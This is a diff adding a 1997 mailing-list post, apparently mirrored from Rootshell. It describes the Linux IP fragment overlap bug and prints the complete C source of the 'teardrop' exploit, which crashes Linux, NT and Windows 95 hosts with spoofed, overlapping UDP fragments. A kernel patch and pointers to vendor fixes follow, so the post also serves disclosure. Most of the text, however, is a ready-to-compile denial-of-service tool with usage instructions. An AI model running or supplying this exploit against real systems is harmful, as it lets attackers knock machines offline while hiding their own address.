@@ -1,0 +1,370 @@
+
+Source: http://www.roothshell.com
+
+Rootshell update:
+
+Linux 2.0.32 will include the IP frag patch for this exploit.  Microsoft has
+a patch that will correct this problem available at :
+
+ftp://ftp.microsoft.com/bussys/winnt/winnt-public/fixes/usa/nt40/hotfixes-postSP3/simptcp-fix
+
+Date:         Thu, 13 Nov 1997 22:06:15 -0800
+From:         G P R <route@RESENTMENT.INFONEXUS.COM>
+Subject:      Linux IP fragment overlap bug
+
+    Helu.
+
+    I wrote this post a while back when the bug was first discovered.  It
+seems as though this bug (and patch) has gotten out, so here it is, in it's
+entirety.
+
+    As it happens, Linux has a serious bug in it's IP fragmentation module.
+More specifically, in the fragmentation reassembly code.  More specifically,
+the bug manifests itself in the `ip_glue()` function....
+
+    When Linux reassembles IP fragments to form the original IP datagram, it
+runs in a loop, copying the payload from all the queued fragments into a newly
+allocated buffer (which would then normally be passed to the IP layer proper).
+From ip_fragment.c@376:
+
+        fp = qp->fragments;
+        while(fp != NULL)
+        {
+                if(count+fp->len > skb->len)
+                {
+                    error_to_big;
+                }
+                memcpy((ptr + fp->offset), fp->ptr, fp->len);
+                count += fp->len;
+                fp = fp->next;
+        }
+
+    While it does check to see if the fragment length is too large, which would
+have the kernel copy too much data, it doesn't check to see if the fragment
+length is too small, which would have the kernel copy WAY too data (such is the
+case if fp->len is < 0).
+
+    To see when this happens, we need to look at how Linux adds IP datagrams
+to the reassembly queue.  From ip_fragment.c@502:
+
+        /*
+         *      Determine the position of this fragment.
+         */
+
+        end = offset + ntohs(iph->tot_len) - ihl;
+
+    Ok.  That's nice.  Now we have to look at what happens when we have
+overlaping fragments...  From ip_fragment.c@531:
+
+        /*
+         *      We found where to put this one.
+         *      Check for overlap with preceding fragment, and, if needed,
+         *      align things so that any overlaps are eliminated.
+         */
+        if (prev != NULL && offset < prev->end)
+        {
+                i = prev->end - offset;
+                offset += i;    /* ptr into datagram */
+                ptr += i;       /* ptr into fragment data */
+        }
+
+    If we find that the current fragment's offset is inside the end of a
+previous fragment (overlap), we need to (try) align it correctly.  Well, this
+is fine and good, unless the payload of the current fragment happens to NOT
+contain enough data to cover the realigning.  In that case, `offset` will end
+up being larger then `end`.  These two values are passed to `ip_frag_create()`
+where the length of the fragment data is computed.  From ip_fragment.c@97:
+
+        /* Fill in the structure. */
+        fp->offset = offset;
+        fp->end = end;
+        fp->len = end - offset;
+
+    This results in fp->len being negative and the memcpy() at the top will end
+up trying to copy entirely too much data, resulting in a reboot or a halt,
+depending on how much physical memory you've got.
+
+    We can trigger this normally unlikely event by simply sending 2 specially
+fragmented IP datagrams.  The first is the 0 offset fragment with a payload of
+size N, with the MF bit on (data content is irrelevant).  The second is the
+last fragment (MF == 0) with a positive offset < N and with a payload of < N.
+
+    Every linux implementation I have been able to look at seems to have this
+problem (1.x - 2.x, including the development kernels).
+
+    Oh, by the way, NT/95 appear to have the bug also.  Try sending 10 - 15 of
+these fragment combos to an NT/95 machine.
+
+    Special thanks to klepto for bringing the problem to my attention and
+writing the initial exploit.
+
+            route|daemon9           route@infonexus.com
+
+------[Begin] -- Guby Linux -------------------------------------------------
+
+/*
+ *  Copyright (c) 1997 route|daemon9  <route@infonexus.com> 11.3.97
+ *
+ *  Linux/NT/95 Overlap frag bug exploit
+ *
+ *  Exploits the overlapping IP fragment bug present in all Linux kernels and
+ *  NT 4.0 / Windows 95 (others?)
+ *
+ *  Based off of:   flip.c by klepto
+ *  Compiles on:    Linux, *BSD*
+ *
+ *  gcc -O2 teardrop.c -o teardrop
+ *      OR
+ *  gcc -O2 teardrop.c -o teardrop -DSTRANGE_BSD_BYTE_ORDERING_THING
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <netinet/udp.h>
+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/socket.h>
+
+#ifdef STRANGE_BSD_BYTE_ORDERING_THING
+                        /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi < 3.0 */
+#define FIX(n)  (n)
+#else                   /* OpenBSD 2.1, all Linux */
+#define FIX(n)  htons(n)
+#endif  /* STRANGE_BSD_BYTE_ORDERING_THING */
+
+#define IP_MF   0x2000  /* More IP fragment en route */
+#define IPH     0x14    /* IP header size */
+#define UDPH    0x8     /* UDP header size */
+#define PADDING 0x1c    /* datagram frame padding for first packet */
+#define MAGIC   0x3     /* Magic Fragment Constant (tm).  Should be 2 or 3 */
+#define COUNT   0x1     /* Linux dies with 1, NT is more stalwart and can
+                         * withstand maybe 5 or 10 sometimes...  Experiment.
+                         */
+void usage(u_char *);
+u_long name_resolve(u_char *);
+u_short in_cksum(u_short *, int);
+void send_frags(int, u_long, u_long, u_short, u_short);
+
+int main(int argc, char **argv)
+{
+    int one = 1, count = 0, i, rip_sock;
+    u_long  src_ip = 0, dst_ip = 0;
+    u_short src_prt = 0, dst_prt = 0;
+    struct in_addr addr;
+
+    fprintf(stderr, "teardrop   route|daemon9\n\n");
+
+    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
+    {
+        perror("raw socket");
+        exit(1);
+    }
+    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one))
+        < 0)
+    {
+        perror("IP_HDRINCL");
+        exit(1);
+    }
+    if (argc < 3) usage(argv[0]);
+    if (!(src_ip = name_resolve(argv[1])) || !(dst_ip = name_resolve(argv[2])))
+    {
+        fprintf(stderr, "What the hell kind of IP address is that?\n");
+        exit(1);
+    }
+
+    while ((i = getopt(argc, argv, "s:t:n:")) != EOF)
+    {
+        switch (i)
+        {
+            case 's':               /* source port (should be emphemeral) */
+                src_prt = (u_short)atoi(optarg);
+                break;
+            case 't':               /* dest port (DNS, anyone?) */
+                dst_prt = (u_short)atoi(optarg);
+                break;
+            case 'n':               /* number to send */
+                count   = atoi(optarg);
+                break;
+            default :
+                usage(argv[0]);
+                break;              /* NOTREACHED */
+        }
+    }
+    srandom((unsigned)(time((time_t)0)));
+    if (!src_prt) src_prt = (random() % 0xffff);
+    if (!dst_prt) dst_prt = (random() % 0xffff);
+    if (!count)   count   = COUNT;
+
+    fprintf(stderr, "Death on flaxen wings:\n");
+    addr.s_addr = src_ip;
+    fprintf(stderr, "From: %15s.%5d\n", inet_ntoa(addr), src_prt);
+    addr.s_addr = dst_ip;
+    fprintf(stderr, "  To: %15s.%5d\n", inet_ntoa(addr), dst_prt);
+    fprintf(stderr, " Amt: %5d\n", count);
+    fprintf(stderr, "[ ");
+
+    for (i = 0; i < count; i++)
+    {
+        send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt);
+        fprintf(stderr, "b00m ");
+        usleep(500);
+    }
+    fprintf(stderr, "]\n");
+    return (0);
+}
+
+/*
+ *  Send two IP fragments with pathological offsets.  We use an implementation
+ *  independent way of assembling network packets that does not rely on any of
+ *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).
+ */
+
+void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,
+                u_short dst_prt)
+{
+    u_char *packet = NULL, *p_ptr = NULL;   /* packet pointers */
+    u_char byte;                            /* a byte */
+    struct sockaddr_in sin;                 /* socket protocol structure */
+
+    sin.sin_family      = AF_INET;
+    sin.sin_port        = src_prt;
+    sin.sin_addr.s_addr = dst_ip;
+
+    /*
+     * Grab some memory for our packet, align p_ptr to point at the beginning
+     * of our packet, and then fill it with zeros.
+     */
+    packet = (u_char *)malloc(IPH + UDPH + PADDING);
+    p_ptr  = packet;
+    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);
+
+    byte = 0x45;                        /* IP version and header length */
+    memcpy(p_ptr, &byte, sizeof(u_char));
+    p_ptr += 2;                         /* IP TOS (skipped) */
+    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING);    /* total length */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(242);   /* IP id */
+    p_ptr += 2;
+    *((u_short *)p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = 0x40;         /* IP TTL */
+    byte = IPPROTO_UDP;
+    memcpy(p_ptr + 1, &byte, sizeof(u_char));
+    p_ptr += 4;                         /* IP checksum filled in by kernel */
+    *((u_long *)p_ptr) = src_ip;        /* IP source address */
+    p_ptr += 4;
+    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
+    p_ptr += 4;
+    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(8 + PADDING);   /* UDP total length */
+
+    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,
+                sizeof(struct sockaddr)) == -1)
+    {
+        perror("\nsendto");
+        free(packet);
+        exit(1);
+    }
+
+    /*  We set the fragment offset to be inside of the previous packet's
+     *  payload (it overlaps inside the previous packet) but do not include
+     *  enough payload to cover complete the datagram.  Just the header will
+     *  do, but to crash NT/95 machines, a bit larger of packet seems to work
+     *  better.
+     */
+    p_ptr = &packet[2];         /* IP total length is 2 bytes into the header */
+    *((u_short *)p_ptr) = FIX(IPH + MAGIC + 1);
+    p_ptr += 4;                 /* IP offset is 6 bytes into the header */
+    *((u_short *)p_ptr) = FIX(MAGIC);
+
+    if (sendto(sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *)&sin,
+                sizeof(struct sockaddr)) == -1)
+    {
+        perror("\nsendto");
+        free(packet);
+        exit(1);
+    }
+    free(packet);
+}
+
+u_long name_resolve(u_char *host_name)
+{
+    struct in_addr addr;
+    struct hostent *host_ent;
+
+    if ((addr.s_addr = inet_addr(host_name)) == -1)
+    {
+        if (!(host_ent = gethostbyname(host_name))) return (0);
+        bcopy(host_ent->h_addr, (char *)&addr.s_addr, host_ent->h_length);
+    }
+    return (addr.s_addr);
+}
+
+void usage(u_char *name)
+{
+    fprintf(stderr,
+            "%s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]\n",
+            name);
+    exit(0);
+}
+
+/* EOF */
+
+------[End] -- Guby Linux ----------------------------------------------------
+
+    And the patch:
+
+------[Begin] -- Helu Linux -------------------------------------------------
+
+--- ip_fragment.c       Mon Nov 10 14:58:38 1997
++++ ip_fragment.c.patched       Mon Nov 10 19:18:52 1997
+@@ -12,6 +12,7 @@
+  *             Alan Cox        :       Split from ip.c , see ip_input.c for history.
+  *             Alan Cox        :       Handling oversized frames
+  *             Uriel Maimon    :       Accounting errors in two fringe cases.
++ *             route           :       IP fragment overlap bug
+  */
+
+ #include <linux/types.h>
+@@ -578,6 +579,22 @@
+                        frag_kfree_s(tmp, sizeof(struct ipfrag));
+                }
+        }
++
++        /*
++         * Uh-oh.  Some one's playing some park shenanigans on us.
++         * IP fragoverlap-linux-go-b00m bug.
++         * route 11.3.97
++         */
++
++        if (offset > end)
++        {
++                skb->sk = NULL;
++                printk("IP: Invalid IP fragment (offset > end) found from %s\n", in_ntoa(iph->saddr));
++                kfree_skb(skb, FREE_READ);
++                ip_statistics.IpReasmFails++;
++                ip_free(qp);
++                return NULL;
++        }
+
+        /*
+         *      Insert this fragment in the chain of fragments.
+
+------[End] -- Helu Linux ----------------------------------------------------
+
+EOF
+
+--
+        Corporate
+                Persuasion
+                         Through
+                               Internet
+                                      Terrorism.
